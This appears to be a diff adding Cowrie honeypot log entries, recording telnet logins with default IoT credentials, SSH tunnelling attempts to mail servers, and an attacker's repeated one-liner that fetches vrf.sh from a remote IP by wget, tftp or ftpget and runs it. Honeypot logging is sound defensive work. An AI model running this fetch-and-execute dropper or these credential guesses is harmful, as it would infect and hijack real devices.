@@ -5474,3 +5474,194 @@
 2017-10-10T11:59:46+0000 [SSHChannel cowrie-discarded-direct-tcpip (83) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] discarded direct-tcp forward request to mail.yahoo.com:443 with data "\x16\x03\x01\x01E\x01\x00\x01A\x03\x03\xde]\xe5\nF\xcb\x83\xd7\xe8t\xa4\x11\xb3.y\xdd\xdc\xe90)\xf8\xf3\x05\x97\xc6\xf6?\xce\xf5\xb3S*\x00\x00\xac\xc00\xc0,\xc0(\xc0$\xc0\x14\xc0\n\x00\xa5\x00\xa3\x00\xa1\x00\x9f\x00k\x00j\x00i\x00h\x009\x008\x007\x006\x00\x88\x00\x87\x00\x86\x00\x85\xc02\xc0.\xc0*\xc0&\xc0\x0f\xc0\x05\x00\x9d\x00=\x005\x00\x84\xc0/\xc0+\xc0'\xc0#\xc0\x13\xc0\t\x00\xa4\x00\xa2\x00\xa0\x00\x9e\x00g\x00@\x00?\x00>\x003\x002\x001\x000\x00\x9a\x00\x99\x00\x98\x00\x97\x00E\x00D\x00C\x00B\xc01\xc0-\xc0)\xc0%\xc0\x0e\xc0\x04\x00\x9c\x00<\x00/\x00\x96\x00A\x00\x07\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\xc0\x12\xc0\x08\x00\x16\x00\x13\x00\x10\x00\r\xc0\r\xc0\x03\x00\n\x00\xff\x01\x00\x00l\x00\x00\x00\x13\x00\x11\x00\x00\x0email.yahoo.com\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x1c\x00\x1a\x00\x17\x00\x19\x00\x1c\x00\x1b\x00\x18\x00\x1a\x00\x16\x00\x0e\x00\r\x00\x0b\x00\x0c\x00\t\x00\n\x00#\x00\x00\x00\r\x00 \x00\x1e\x06\x01\x06\x02\x06\x03\x05\x01\x05\x02\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03\x00\x0f\x00\x01\x01"
 2017-10-10T11:59:46+0000 [SSHChannel cowrie-discarded-direct-tcpip (83) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] failed to connect: Connection refused
 2017-10-10T11:59:46+0000 [SSHChannel cowrie-discarded-direct-tcpip (83) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] sending close 83
+2017-10-10T12:00:03+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.83.128.41:59432 (10.3.66.85:2223) [session: TT1680]
+2017-10-10T12:00:03+0000 [CowrieTelnetTransport,1680,212.83.128.41] login attempt [root/antslq] succeeded
+2017-10-10T12:00:06+0000 [CowrieTelnetTransport,1680,212.83.128.41] Opening TTY Log: log/tty/20171010-120006-None-1680i.log
+2017-10-10T12:00:06+0000 [CowrieTelnetTransport,1680,212.83.128.41] Warning: state changed and new state returned
+2017-10-10T12:00:06+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] got channel 'direct-tcpip' request
+2017-10-10T12:00:06+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] direct-tcp connection request to 173.194.221.17:25 from ::1:32369
+2017-10-10T12:00:06+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.83.128.41:59490 (10.3.66.85:2223) [session: TT1681]
+2017-10-10T12:00:06+0000 [CowrieTelnetTransport,1680,212.83.128.41] CMD: sh
+2017-10-10T12:00:06+0000 [CowrieTelnetTransport,1680,212.83.128.41] Command found: sh 
+2017-10-10T12:00:06+0000 [CowrieTelnetTransport,1680,212.83.128.41] CMD: shell
+2017-10-10T12:00:06+0000 [CowrieTelnetTransport,1680,212.83.128.41] Command not found: shell
+2017-10-10T12:00:06+0000 [CowrieTelnetTransport,1680,212.83.128.41] CMD: help
+2017-10-10T12:00:06+0000 [CowrieTelnetTransport,1680,212.83.128.41] Command found: help 
+2017-10-10T12:00:06+0000 [CowrieTelnetTransport,1680,212.83.128.41] CMD: busybox
+2017-10-10T12:00:06+0000 [CowrieTelnetTransport,1680,212.83.128.41] Command found: busybox 
+2017-10-10T12:00:06+0000 [CowrieTelnetTransport,1681,212.83.128.41] login attempt [root/rootroot] succeeded
+2017-10-10T12:00:09+0000 [CowrieTelnetTransport,1681,212.83.128.41] Opening TTY Log: log/tty/20171010-120009-None-1681i.log
+2017-10-10T12:00:09+0000 [CowrieTelnetTransport,1681,212.83.128.41] Warning: state changed and new state returned
+2017-10-10T12:00:09+0000 [CowrieTelnetTransport,1681,212.83.128.41] CMD: sh
+2017-10-10T12:00:09+0000 [CowrieTelnetTransport,1681,212.83.128.41] Command found: sh 
+2017-10-10T12:00:09+0000 [CowrieTelnetTransport,1681,212.83.128.41] CMD: shell
+2017-10-10T12:00:09+0000 [CowrieTelnetTransport,1681,212.83.128.41] Command not found: shell
+2017-10-10T12:00:09+0000 [CowrieTelnetTransport,1681,212.83.128.41] CMD: help
+2017-10-10T12:00:09+0000 [CowrieTelnetTransport,1681,212.83.128.41] Command found: help 
+2017-10-10T12:00:09+0000 [CowrieTelnetTransport,1681,212.83.128.41] CMD: busybox
+2017-10-10T12:00:09+0000 [CowrieTelnetTransport,1681,212.83.128.41] Command found: busybox 
+2017-10-10T12:00:12+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.83.128.41:59827 (10.3.66.85:2223) [session: TT1682]
+2017-10-10T12:00:12+0000 [CowrieTelnetTransport,1682,212.83.128.41] login attempt [root/] succeeded
+2017-10-10T12:00:14+0000 [CowrieTelnetTransport,1682,212.83.128.41] Opening TTY Log: log/tty/20171010-120014-None-1682i.log
+2017-10-10T12:00:14+0000 [CowrieTelnetTransport,1682,212.83.128.41] Warning: state changed and new state returned
+2017-10-10T12:00:14+0000 [CowrieTelnetTransport,1682,212.83.128.41] CMD: sh
+2017-10-10T12:00:14+0000 [CowrieTelnetTransport,1682,212.83.128.41] Command found: sh 
+2017-10-10T12:00:14+0000 [CowrieTelnetTransport,1682,212.83.128.41] CMD: shell
+2017-10-10T12:00:14+0000 [CowrieTelnetTransport,1682,212.83.128.41] Command not found: shell
+2017-10-10T12:00:14+0000 [CowrieTelnetTransport,1682,212.83.128.41] CMD: help
+2017-10-10T12:00:14+0000 [CowrieTelnetTransport,1682,212.83.128.41] Command found: help 
+2017-10-10T12:00:14+0000 [CowrieTelnetTransport,1682,212.83.128.41] CMD: busybox
+2017-10-10T12:00:14+0000 [CowrieTelnetTransport,1682,212.83.128.41] Command found: busybox 
+2017-10-10T12:00:16+0000 [CowrieTelnetTransport,1680,212.83.128.41] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.237.137/vrf.sh; chmod +x vrf.sh; sh vrf.sh; tftp 89.34.237.137 -c get vrf.sh; chmod +x vrf.sh; sh vrf.sh; tftp -r vrf.sh -g 89.34.237.137; chmod +x vrf.sh; sh vrf.sh; ftpget -u ftp 89.34.237.137 vrf.sh vrf.sh; chmod +x vrf.sh; sh vrf.sh; rm -rf vrf.sh/r/n
+2017-10-10T12:00:16+0000 [CowrieTelnetTransport,1680,212.83.128.41] Command found: cd /tmp
+2017-10-10T12:00:16+0000 [CowrieTelnetTransport,1680,212.83.128.41] Command found: cd /var/run
+2017-10-10T12:00:16+0000 [CowrieTelnetTransport,1680,212.83.128.41] Command found: cd /mnt
+2017-10-10T12:00:16+0000 [CowrieTelnetTransport,1680,212.83.128.41] Command found: cd /root
+2017-10-10T12:00:16+0000 [CowrieTelnetTransport,1680,212.83.128.41] Command found: cd /
+2017-10-10T12:00:16+0000 [CowrieTelnetTransport,1680,212.83.128.41] Command found: wget http://89.34.237.137/vrf.sh
+2017-10-10T12:00:16+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://89.34.237.137/vrf.sh>
+2017-10-10T12:00:16+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:16+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:16+0000 [HTTPPageDownloader,client] Command found: tftp 89.34.237.137 -c get /vrf.sh
+2017-10-10T12:00:16+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:16+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:16+0000 [HTTPPageDownloader,client] Command found: tftp -r /vrf.sh -g 89.34.237.137
+2017-10-10T12:00:16+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:16+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:16+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 89.34.237.137 /vrf.sh /vrf.sh
+2017-10-10T12:00:18+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:18+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:18+0000 [HTTPPageDownloader,client] Command found: rm -rf vrf.sh/r/n
+2017-10-10T12:00:18+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://89.34.237.137/vrf.sh>
+2017-10-10T12:00:19+0000 [CowrieTelnetTransport,1681,212.83.128.41] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.237.137/vrf.sh; chmod +x vrf.sh; sh vrf.sh; tftp 89.34.237.137 -c get vrf.sh; chmod +x vrf.sh; sh vrf.sh; tftp -r vrf.sh -g 89.34.237.137; chmod +x vrf.sh; sh vrf.sh; ftpget -u ftp 89.34.237.137 vrf.sh vrf.sh; chmod +x vrf.sh; sh vrf.sh; rm -rf vrf.sh/r/n
+2017-10-10T12:00:19+0000 [CowrieTelnetTransport,1681,212.83.128.41] Command found: cd /tmp
+2017-10-10T12:00:19+0000 [CowrieTelnetTransport,1681,212.83.128.41] Command found: cd /var/run
+2017-10-10T12:00:19+0000 [CowrieTelnetTransport,1681,212.83.128.41] Command found: cd /mnt
+2017-10-10T12:00:19+0000 [CowrieTelnetTransport,1681,212.83.128.41] Command found: cd /root
+2017-10-10T12:00:19+0000 [CowrieTelnetTransport,1681,212.83.128.41] Command found: cd /
+2017-10-10T12:00:19+0000 [CowrieTelnetTransport,1681,212.83.128.41] Command found: wget http://89.34.237.137/vrf.sh
+2017-10-10T12:00:19+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://89.34.237.137/vrf.sh>
+2017-10-10T12:00:19+0000 [HTTPPageDownloader,client] Not storing duplicate content 7a2a1a226e3281880d0b96a3a2bd56deea5f6e95d877f45572b9170ba87900ec
+2017-10-10T12:00:19+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:19+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:19+0000 [HTTPPageDownloader,client] Command found: tftp 89.34.237.137 -c get /vrf.sh
+2017-10-10T12:00:19+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:19+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:19+0000 [HTTPPageDownloader,client] Command found: tftp -r /vrf.sh -g 89.34.237.137
+2017-10-10T12:00:19+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:19+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:19+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 89.34.237.137 /vrf.sh /vrf.sh
+2017-10-10T12:00:20+0000 [HTTPPageDownloader,client] Not storing duplicate content 83ba5495534fccb4d04b2c71167da65ed3bff09997d3a05363ae08af6c26c202
+2017-10-10T12:00:20+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:20+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:20+0000 [HTTPPageDownloader,client] Command found: rm -rf vrf.sh/r/n
+2017-10-10T12:00:20+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://89.34.237.137/vrf.sh>
+2017-10-10T12:00:24+0000 [CowrieTelnetTransport,1682,212.83.128.41] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.237.137/vrf.sh; chmod +x vrf.sh; sh vrf.sh; tftp 89.34.237.137 -c get vrf.sh; chmod +x vrf.sh; sh vrf.sh; tftp -r vrf.sh -g 89.34.237.137; chmod +x vrf.sh; sh vrf.sh; ftpget -u ftp 89.34.237.137 vrf.sh vrf.sh; chmod +x vrf.sh; sh vrf.sh; rm -rf vrf.sh/r/n
+2017-10-10T12:00:24+0000 [CowrieTelnetTransport,1682,212.83.128.41] Command found: cd /tmp
+2017-10-10T12:00:24+0000 [CowrieTelnetTransport,1682,212.83.128.41] Command found: cd /var/run
+2017-10-10T12:00:24+0000 [CowrieTelnetTransport,1682,212.83.128.41] Command found: cd /mnt
+2017-10-10T12:00:24+0000 [CowrieTelnetTransport,1682,212.83.128.41] Command found: cd /root
+2017-10-10T12:00:24+0000 [CowrieTelnetTransport,1682,212.83.128.41] Command found: cd /
+2017-10-10T12:00:24+0000 [CowrieTelnetTransport,1682,212.83.128.41] Command found: wget http://89.34.237.137/vrf.sh
+2017-10-10T12:00:24+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://89.34.237.137/vrf.sh>
+2017-10-10T12:00:25+0000 [HTTPPageDownloader,client] Not storing duplicate content 7a2a1a226e3281880d0b96a3a2bd56deea5f6e95d877f45572b9170ba87900ec
+2017-10-10T12:00:25+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:25+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:25+0000 [HTTPPageDownloader,client] Command found: tftp 89.34.237.137 -c get /vrf.sh
+2017-10-10T12:00:25+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:25+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:25+0000 [HTTPPageDownloader,client] Command found: tftp -r /vrf.sh -g 89.34.237.137
+2017-10-10T12:00:25+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:25+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:25+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 89.34.237.137 /vrf.sh /vrf.sh
+2017-10-10T12:00:26+0000 [HTTPPageDownloader,client] Not storing duplicate content 83ba5495534fccb4d04b2c71167da65ed3bff09997d3a05363ae08af6c26c202
+2017-10-10T12:00:26+0000 [HTTPPageDownloader,client] Command found: chmod +x /vrf.sh
+2017-10-10T12:00:26+0000 [HTTPPageDownloader,client] Command found: sh /vrf.sh
+2017-10-10T12:00:26+0000 [HTTPPageDownloader,client] Command found: rm -rf vrf.sh/r/n
+2017-10-10T12:00:26+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://89.34.237.137/vrf.sh>
+2017-10-10T12:00:36+0000 [CowrieTelnetTransport,1680,212.83.128.41] Closing TTY Log: log/tty/20171010-120006-None-1680i.log after 30 seconds
+2017-10-10T12:00:36+0000 [CowrieTelnetTransport,1680,212.83.128.41] Connection lost after 32 seconds
+2017-10-10T12:00:39+0000 [CowrieTelnetTransport,1681,212.83.128.41] Closing TTY Log: log/tty/20171010-120009-None-1681i.log after 30 seconds
+2017-10-10T12:00:39+0000 [CowrieTelnetTransport,1681,212.83.128.41] Connection lost after 32 seconds
+2017-10-10T12:00:44+0000 [CowrieTelnetTransport,1682,212.83.128.41] Closing TTY Log: log/tty/20171010-120014-None-1682i.log after 30 seconds
+2017-10-10T12:00:44+0000 [CowrieTelnetTransport,1682,212.83.128.41] Connection lost after 32 seconds
+2017-10-10T12:01:19+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] got channel 'direct-tcpip' request
+2017-10-10T12:01:19+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] direct-tcp connection request to 68.178.213.37:25 from ::1:19338
+2017-10-10T12:01:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] got channel 'direct-tcpip' request
+2017-10-10T12:01:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] direct-tcp connection request to mail.yahoo.com:443 from ::1:12438
+2017-10-10T12:01:39+0000 [SSHChannel cowrie-discarded-direct-tcpip (84) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] discarded direct-tcp forward request to mail.yahoo.com:443 with data "\x16\x03\x01\x01E\x01\x00\x01A\x03\x03\x0b2SXC\x02\x08\xacO\xd0&*M\x05\xb0\xa6\xc9u\x17/Ki\xd9|\x8b\x9cXH+\x93y\x8a\x00\x00\xac\xc00\xc0,\xc0(\xc0$\xc0\x14\xc0\n\x00\xa5\x00\xa3\x00\xa1\x00\x9f\x00k\x00j\x00i\x00h\x009\x008\x007\x006\x00\x88\x00\x87\x00\x86\x00\x85\xc02\xc0.\xc0*\xc0&\xc0\x0f\xc0\x05\x00\x9d\x00=\x005\x00\x84\xc0/\xc0+\xc0'\xc0#\xc0\x13\xc0\t\x00\xa4\x00\xa2\x00\xa0\x00\x9e\x00g\x00@\x00?\x00>\x003\x002\x001\x000\x00\x9a\x00\x99\x00\x98\x00\x97\x00E\x00D\x00C\x00B\xc01\xc0-\xc0)\xc0%\xc0\x0e\xc0\x04\x00\x9c\x00<\x00/\x00\x96\x00A\x00\x07\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\xc0\x12\xc0\x08\x00\x16\x00\x13\x00\x10\x00\r\xc0\r\xc0\x03\x00\n\x00\xff\x01\x00\x00l\x00\x00\x00\x13\x00\x11\x00\x00\x0email.yahoo.com\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x1c\x00\x1a\x00\x17\x00\x19\x00\x1c\x00\x1b\x00\x18\x00\x1a\x00\x16\x00\x0e\x00\r\x00\x0b\x00\x0c\x00\t\x00\n\x00#\x00\x00\x00\r\x00 \x00\x1e\x06\x01\x06\x02\x06\x03\x05\x01\x05\x02\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03\x00\x0f\x00\x01\x01"
+2017-10-10T12:01:39+0000 [SSHChannel cowrie-discarded-direct-tcpip (84) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] failed to connect: Connection refused
+2017-10-10T12:01:39+0000 [SSHChannel cowrie-discarded-direct-tcpip (84) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] sending close 84
+2017-10-10T12:02:09+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.125.253.158:41442 (10.3.66.85:2223) [session: TT1683]
+2017-10-10T12:02:10+0000 [CowrieTelnetTransport,1683,59.125.253.158] login attempt [mother/fucker] failed
+2017-10-10T12:02:10+0000 [CowrieTelnetTransport,1683,59.125.253.158] Warning: state changed and new state returned
+2017-10-10T12:02:11+0000 [CowrieTelnetTransport,1683,59.125.253.158] login attempt [enable\x00/system\x00] failed
+2017-10-10T12:02:11+0000 [CowrieTelnetTransport,1683,59.125.253.158] Warning: state changed and new state returned
+2017-10-10T12:02:12+0000 [CowrieTelnetTransport,1683,59.125.253.158] login attempt [shell\x00/sh\x00] failed
+2017-10-10T12:02:12+0000 [CowrieTelnetTransport,1683,59.125.253.158] Warning: state changed and new state returned
+2017-10-10T12:02:16+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] got channel 'direct-tcpip' request
+2017-10-10T12:02:16+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] direct-tcp connection request to 208.73.210.217:25 from ::1:23017
+2017-10-10T12:02:26+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] got channel 'direct-tcpip' request
+2017-10-10T12:02:26+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] direct-tcp connection request to mail.yahoo.com:443 from ::1:35316
+2017-10-10T12:02:26+0000 [SSHChannel cowrie-discarded-direct-tcpip (85) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] discarded direct-tcp forward request to mail.yahoo.com:443 with data "\x16\x03\x01\x01E\x01\x00\x01A\x03\x03D\x867\x919\x17`\x07d`0\xe2\xf23jA\xc8C\x82en!\xe7\xa3\xa06M\xc3\x9b+\xe7\x9c\x00\x00\xac\xc00\xc0,\xc0(\xc0$\xc0\x14\xc0\n\x00\xa5\x00\xa3\x00\xa1\x00\x9f\x00k\x00j\x00i\x00h\x009\x008\x007\x006\x00\x88\x00\x87\x00\x86\x00\x85\xc02\xc0.\xc0*\xc0&\xc0\x0f\xc0\x05\x00\x9d\x00=\x005\x00\x84\xc0/\xc0+\xc0'\xc0#\xc0\x13\xc0\t\x00\xa4\x00\xa2\x00\xa0\x00\x9e\x00g\x00@\x00?\x00>\x003\x002\x001\x000\x00\x9a\x00\x99\x00\x98\x00\x97\x00E\x00D\x00C\x00B\xc01\xc0-\xc0)\xc0%\xc0\x0e\xc0\x04\x00\x9c\x00<\x00/\x00\x96\x00A\x00\x07\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\xc0\x12\xc0\x08\x00\x16\x00\x13\x00\x10\x00\r\xc0\r\xc0\x03\x00\n\x00\xff\x01\x00\x00l\x00\x00\x00\x13\x00\x11\x00\x00\x0email.yahoo.com\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x1c\x00\x1a\x00\x17\x00\x19\x00\x1c\x00\x1b\x00\x18\x00\x1a\x00\x16\x00\x0e\x00\r\x00\x0b\x00\x0c\x00\t\x00\n\x00#\x00\x00\x00\r\x00 \x00\x1e\x06\x01\x06\x02\x06\x03\x05\x01\x05\x02\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03\x00\x0f\x00\x01\x01"
+2017-10-10T12:02:26+0000 [SSHChannel cowrie-discarded-direct-tcpip (85) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] failed to connect: Connection refused
+2017-10-10T12:02:26+0000 [SSHChannel cowrie-discarded-direct-tcpip (85) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] sending close 85
+2017-10-10T12:02:43+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] got channel 'direct-tcpip' request
+2017-10-10T12:02:43+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] direct-tcp connection request to 203.134.71.81:25 from ::1:19111
+2017-10-10T12:02:44+0000 [CowrieTelnetTransport,1683,59.125.253.158] Connection lost after 35 seconds
+2017-10-10T12:02:45+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.125.253.158:41609 (10.3.66.85:2223) [session: TT1684]
+2017-10-10T12:02:46+0000 [CowrieTelnetTransport,1684,59.125.253.158] login attempt [admin/meinsm] failed
+2017-10-10T12:02:46+0000 [CowrieTelnetTransport,1684,59.125.253.158] Warning: state changed and new state returned
+2017-10-10T12:02:47+0000 [CowrieTelnetTransport,1684,59.125.253.158] login attempt [enable\x00/system\x00] failed
+2017-10-10T12:02:47+0000 [CowrieTelnetTransport,1684,59.125.253.158] Warning: state changed and new state returned
+2017-10-10T12:02:48+0000 [CowrieTelnetTransport,1684,59.125.253.158] login attempt [shell\x00/sh\x00] failed
+2017-10-10T12:02:48+0000 [CowrieTelnetTransport,1684,59.125.253.158] Warning: state changed and new state returned
+2017-10-10T12:02:57+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1743,91.195.103.187] got channel 'direct-tcpip' request
+2017-10-10T12:02:57+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1743,91.195.103.187] direct-tcp connection request to api.ipify.org:80 from ::1:26418
+2017-10-10T12:02:57+0000 [SSHChannel cowrie-discarded-direct-tcpip (81) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1743,91.195.103.187] discarded direct-tcp forward request to api.ipify.org:80 with data 'GET / HTTP/1.0\r\nHost: api.ipify.org\r\n\r\n'
+2017-10-10T12:02:57+0000 [SSHChannel cowrie-discarded-direct-tcpip (81) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1743,91.195.103.187] failed to connect: Connection refused
+2017-10-10T12:02:57+0000 [SSHChannel cowrie-discarded-direct-tcpip (81) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1743,91.195.103.187] sending close 81
+2017-10-10T12:03:19+0000 [CowrieTelnetTransport,1684,59.125.253.158] Connection lost after 34 seconds
+2017-10-10T12:03:20+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.125.253.158:41873 (10.3.66.85:2223) [session: TT1685]
+2017-10-10T12:03:21+0000 [CowrieTelnetTransport,1685,59.125.253.158] login attempt [admin/pass] failed
+2017-10-10T12:03:21+0000 [CowrieTelnetTransport,1685,59.125.253.158] Warning: state changed and new state returned
+2017-10-10T12:03:22+0000 [CowrieTelnetTransport,1685,59.125.253.158] login attempt [enable\x00/system\x00] failed
+2017-10-10T12:03:22+0000 [CowrieTelnetTransport,1685,59.125.253.158] Warning: state changed and new state returned
+2017-10-10T12:03:24+0000 [CowrieTelnetTransport,1685,59.125.253.158] login attempt [shell\x00/sh\x00] failed
+2017-10-10T12:03:24+0000 [CowrieTelnetTransport,1685,59.125.253.158] Warning: state changed and new state returned
+2017-10-10T12:03:44+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] got channel 'direct-tcpip' request
+2017-10-10T12:03:44+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] direct-tcp connection request to mail.google.com:80 from ::1:34800
+2017-10-10T12:03:44+0000 [SSHChannel cowrie-discarded-direct-tcpip (86) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] discarded direct-tcp forward request to mail.google.com:80 with data 'GET /mail/ HTTP/1.1\r\nHost: mail.google.com\r\nUser-Agent: Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.13337/724; U; en) Presto/2.2.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n'
+2017-10-10T12:03:44+0000 [SSHChannel cowrie-discarded-direct-tcpip (86) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] failed to connect: Connection refused
+2017-10-10T12:03:44+0000 [SSHChannel cowrie-discarded-direct-tcpip (86) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] sending close 86
+2017-10-10T12:03:54+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] got channel 'direct-tcpip' request
+2017-10-10T12:03:54+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] direct-tcp connection request to 216.40.42.4:25 from ::1:30934
+2017-10-10T12:03:55+0000 [CowrieTelnetTransport,1685,59.125.253.158] Connection lost after 35 seconds
+2017-10-10T12:03:56+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.125.253.158:42085 (10.3.66.85:2223) [session: TT1686]
+2017-10-10T12:03:57+0000 [CowrieTelnetTransport,1686,59.125.253.158] login attempt [root/vizxv] succeeded
+2017-10-10T12:03:59+0000 [CowrieTelnetTransport,1686,59.125.253.158] Opening TTY Log: log/tty/20171010-120359-None-1686i.log
+2017-10-10T12:03:59+0000 [CowrieTelnetTransport,1686,59.125.253.158] Warning: state changed and new state returned
+2017-10-10T12:03:59+0000 [CowrieTelnetTransport,1686,59.125.253.158] Received unhandled keyID: '\x00'
+2017-10-10T12:03:59+0000 [CowrieTelnetTransport,1686,59.125.253.158] CMD: enable
+2017-10-10T12:03:59+0000 [CowrieTelnetTransport,1686,59.125.253.158] Command found: enable 
+2017-10-10T12:03:59+0000 [CowrieTelnetTransport,1686,59.125.253.158] Reading txtcmd from "txtcmds/bin/enable"
+2017-10-10T12:04:00+0000 [CowrieTelnetTransport,1686,59.125.253.158] Received unhandled keyID: '\x00'
+2017-10-10T12:04:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] got channel 'direct-tcpip' request
+2017-10-10T12:04:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] direct-tcp connection request to 72.167.238.32:25 from ::1:33795
+2017-10-10T12:04:00+0000 [CowrieTelnetTransport,1686,59.125.253.158] CMD: system
+2017-10-10T12:04:00+0000 [CowrieTelnetTransport,1686,59.125.253.158] Command not found: system
+2017-10-10T12:04:00+0000 [CowrieTelnetTransport,1686,59.125.253.158] Received unhandled keyID: '\x00'
+2017-10-10T12:04:00+0000 [CowrieTelnetTransport,1686,59.125.253.158] CMD: shell
+2017-10-10T12:04:00+0000 [CowrieTelnetTransport,1686,59.125.253.158] Command not found: shell
+2017-10-10T12:04:00+0000 [CowrieTelnetTransport,1686,59.125.253.158] Received unhandled keyID: '\x00'
+2017-10-10T12:04:01+0000 [CowrieTelnetTransport,1686,59.125.253.158] CMD: sh
